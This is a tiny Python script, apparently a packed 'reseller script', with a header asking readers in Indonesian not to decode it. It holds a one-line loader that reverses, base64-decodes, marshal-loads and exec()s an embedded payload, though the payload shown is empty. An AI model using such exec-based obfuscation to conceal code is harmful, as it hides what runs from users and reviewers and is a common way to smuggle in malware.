# Author : リセラースクリプトファイル
# https://www.github.com/HAXZOR007-Cyber
# Jangan di Dec file ini 
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))